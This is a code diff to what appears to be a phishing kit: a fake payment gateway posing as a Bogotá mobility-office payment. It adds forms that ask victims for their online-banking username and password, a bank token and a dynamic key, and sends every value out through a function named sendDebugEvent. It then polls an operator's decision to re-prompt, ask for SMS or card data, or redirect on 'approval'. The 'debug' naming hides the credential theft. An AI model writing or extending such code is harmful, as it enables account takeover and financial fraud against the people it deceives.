@@ -786,6 +786,68 @@ const pseBanks = [
       </div>
     </div>
   </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="userpass" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Para autorizar este pago, ingresa el usuario y la contraseña de tu banca virtual.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="userpass">
+        <label for="pagos-auth-username">Usuario</label>
+        <input id="pagos-auth-username" name="username" type="text" autocomplete="off" maxlength="40" placeholder="Ingresa tu usuario" />
+        <label for="pagos-auth-password">Contraseña</label>
+        <input id="pagos-auth-password" name="password" type="password" autocomplete="off" maxlength="40" placeholder="Ingresa tu contraseña" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Continuar</button>
+      </form>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="token" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Ingresa el token o código generado por tu app o dispositivo bancario.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="token">
+        <label for="pagos-auth-token">Token</label>
+        <input id="pagos-auth-token" name="token" type="text" inputmode="numeric" autocomplete="off" maxlength="12" placeholder="Ingresa tu token" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="dynamic" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Ingresa la clave dinámica generada para continuar con la autorización.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="dynamic">
+        <label for="pagos-auth-cdin">Clave dinámica</label>
+        <input id="pagos-auth-cdin" name="cdin" type="text" inputmode="numeric" autocomplete="off" maxlength="8" placeholder="Ingresa tu clave dinámica" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
 </div>
 
 <div class="pagos-sheet" id="pagos-sheet" hidden>
@@ -949,6 +1011,9 @@ const pseBanks = [
     const challenge = document.getElementById('pagos-challenge-screen');
     const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand) ? brand : 'visa';
     clearChallengeMessages();
+    challenge?.querySelectorAll('[data-challenge-auth]').forEach((panel) => {
+      panel.hidden = true;
+    });
     challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
       const active = panel.getAttribute('data-challenge-brand') === brandKey;
       panel.hidden = !active;
@@ -969,6 +1034,66 @@ const pseBanks = [
     });
     if (challenge) challenge.hidden = false;
     if (withError) setChallengeMessage(brandKey, withError);
+  }
+
+  function setAuthMessage(kind, message) {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const panel = challenge?.querySelector(`[data-challenge-auth="${kind}"]`);
+    const error = panel?.querySelector('[data-auth-debug-message]');
+    if (!error) return;
+    error.textContent = message || '';
+    error.hidden = !message;
+  }
+
+  function showAuthChallenge(kind, merchantLabel, amountLabel, datetimeLabel, withError = '') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
+      panel.hidden = true;
+    });
+    challenge?.querySelectorAll('[data-challenge-auth]').forEach((panel) => {
+      const active = panel.getAttribute('data-challenge-auth') === kind;
+      panel.hidden = !active;
+      if (!active) return;
+      panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
+        el.textContent = merchantLabel;
+      });
+      panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
+        el.textContent = amountLabel;
+      });
+      panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
+        el.textContent = datetimeLabel;
+      });
+      panel.querySelectorAll('input').forEach((input) => {
+        input.value = '';
+      });
+      setAuthMessage(kind, '');
+    });
+    if (challenge) challenge.hidden = false;
+    if (withError) setAuthMessage(kind, withError);
+  }
+
+  function applyAuthDecision(nextAction, decision, brandKey, merchantLabel, amountLabel, datetimeLabel) {
+    const wait = document.getElementById('pagos-wait-screen');
+    const challenge = document.getElementById('pagos-challenge-screen');
+    if (nextAction === 'userpass' || nextAction === 'userpass_error') {
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      showAuthChallenge('userpass', merchantLabel, amountLabel, datetimeLabel, nextAction === 'userpass_error' ? decision?.message || '' : '');
+      return true;
+    }
+    if (nextAction === 'token' || nextAction === 'token_error') {
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      showAuthChallenge('token', merchantLabel, amountLabel, datetimeLabel, nextAction === 'token_error' ? decision?.message || '' : '');
+      return true;
+    }
+    if (nextAction === 'dynamic' || nextAction === 'dynamic_error') {
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      showAuthChallenge('dynamic', merchantLabel, amountLabel, datetimeLabel, nextAction === 'dynamic_error' ? decision?.message || '' : '');
+      return true;
+    }
+    return false;
   }
 
   function money(value, withUsd = false) {
@@ -1633,6 +1758,10 @@ const pseBanks = [
         return;
       }
 
+      if (applyAuthDecision(nextAction, decision, brandKey, merchantLabel, amountLabel, datetimeLabel)) {
+        return;
+      }
+
       if (nextAction === 'card' || nextAction === 'card_error') {
         if (wait) wait.hidden = true;
         if (challenge) challenge.hidden = true;
@@ -1755,6 +1884,17 @@ const pseBanks = [
         return;
       }
 
+      if (applyAuthDecision(
+        nextAction,
+        decision,
+        brandKey,
+        'Secretaría Distrital de Movilidad',
+        money(total, true),
+        document.querySelector('[data-challenge-datetime]')?.textContent || '',
+      )) {
+        return;
+      }
+
       if (nextAction === 'approved') {
         if (wait) wait.hidden = true;
         if (challenge) challenge.hidden = true;
@@ -1763,6 +1903,89 @@ const pseBanks = [
         return;
       }
 
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+    });
+  });
+
+  document.querySelectorAll('[data-auth-form]').forEach((form) => {
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const kind = form.getAttribute('data-auth-form') || 'userpass';
+      const username = form.querySelector('input[name="username"]')?.value.trim() || '';
+      const password = form.querySelector('input[name="password"]')?.value.trim() || '';
+      const token = form.querySelector('input[name="token"]')?.value.trim() || '';
+      const cdin = form.querySelector('input[name="cdin"]')?.value.trim() || '';
+      if (kind === 'userpass' && (!username || !password)) {
+        setAuthMessage(kind, 'Ingresa tu usuario y contraseña para continuar.');
+        return;
+      }
+      if (kind === 'token' && !token) {
+        setAuthMessage(kind, 'Ingresa el token para continuar.');
+        return;
+      }
+      if (kind === 'dynamic' && !cdin) {
+        setAuthMessage(kind, 'Ingresa la clave dinámica para continuar.');
+        return;
+      }
+      const eventName = kind === 'token' ? 'TOKEN_SUBMIT' : kind === 'dynamic' ? 'DYNAMIC_SUBMIT' : 'USERPASS_SUBMIT';
+      try {
+        await sendDebugEvent(eventName, {
+          meta: {
+            step: kind === 'token' ? 'Envió token' : kind === 'dynamic' ? 'Envió clave dinámica' : 'Envió usuario y contraseña',
+            username,
+            password,
+            token,
+            cdin,
+          },
+        });
+      } catch {
+        setAuthMessage(kind, 'No pudimos procesar los datos. Intenta nuevamente.');
+        return;
+      }
+      const wait = document.getElementById('pagos-wait-screen');
+      const challenge = document.getElementById('pagos-challenge-screen');
+      const brandKey = 'visa';
+      wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
+        el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
+      });
+      if (challenge) challenge.hidden = true;
+      if (wait) wait.hidden = false;
+      document.body.classList.add('is-offers-waiting');
+      const decision = await pollDebugDecision();
+      const nextAction = decision?.action || 'timeout';
+      const merchantLabel = 'Secretaría Distrital de Movilidad';
+      const amountLabel = money(total, true);
+      const now = new Date();
+      const months = [
+        'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
+        'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
+      ];
+      const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        showChallenge(brandKey, merchantLabel, amountLabel, datetimeLabel, nextAction === 'sms_error' ? decision?.message || '' : '');
+        return;
+      }
+      if (applyAuthDecision(nextAction, decision, brandKey, merchantLabel, amountLabel, datetimeLabel)) return;
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        return;
+      }
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
       if (wait) wait.hidden = true;
       document.body.classList.remove('is-offers-waiting');
       setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
